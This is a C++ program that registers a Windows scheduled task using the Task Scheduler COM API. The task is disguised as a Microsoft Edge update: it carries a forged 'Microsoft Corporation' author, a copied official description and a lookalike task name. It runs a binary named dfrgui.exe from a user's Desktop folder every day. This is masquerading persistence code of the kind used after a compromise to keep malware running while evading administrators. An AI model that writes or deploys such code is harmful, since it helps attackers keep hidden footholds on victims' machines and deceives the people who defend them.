#include <windows.h>
#include <taskschd.h>
#include <comutil.h>
#include <iostream>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

int main()
{
    // Initialize COM
    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // Set up the Task Scheduler interface
    ITaskService* pService = NULL;
    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

    // Get the task folder
    ITaskFolder* pRootFolder = NULL;
    pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);

    // Set up the task definition
    ITaskDefinition* pTask = NULL;
    pService->NewTask(0, &pTask);

    // Set up the registration information
    IRegistrationInfo* pRegInfo = NULL;
    pTask->get_RegistrationInfo(&pRegInfo);
    pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));
    pRegInfo->put_Description(_bstr_t(L"Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it."));


    // Set up the principal
    IPrincipal* pPrincipal = NULL;
    pTask->get_Principal(&pPrincipal);
    pPrincipal->put_Id(_bstr_t(L"Principal1"));
    pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);

    // Create the daily trigger
    ITriggerCollection* pTriggerCollection = NULL;
    pTask->get_Triggers(&pTriggerCollection);
    ITrigger* pTrigger = NULL;
    pTriggerCollection->Create(TASK_TRIGGER_DAILY, &pTrigger);
    IDailyTrigger* pDailyTrigger = NULL;
    pTrigger->QueryInterface(IID_IDailyTrigger, (void**)&pDailyTrigger);
    pDailyTrigger->put_DaysInterval(1);

    // Set the start time for the trigger
    pTrigger->put_StartBoundary(_bstr_t(L"2024-01-01T10:00:00"));
    pTrigger->put_EndBoundary(_bstr_t(L"2024-12-31T10:00:00"));

    // Create the action for the task to execute
    IActionCollection* pActionCollection = NULL;
    pTask->get_Actions(&pActionCollection);
    IAction* pAction = NULL;
    pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    IExecAction* pExecAction = NULL;
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);

    // Set the path of the executable for the action
    pExecAction->put_WorkingDirectory(_bstr_t(L"C:\\Users\\kali\\Desktop\\dfrgui"));
    pExecAction->put_Path(_bstr_t(L"dfrgui.exe"));

    // Save the task
    IRegisteredTask* pRegisteredTask = NULL;
    pRootFolder->RegisterTaskDefinition(_bstr_t(L"MicrosoftEdgeUpdateTaskMachine"),
        pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegisteredTask);

    // Clean up
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
    std::cout << "OK";
    return 0;
}
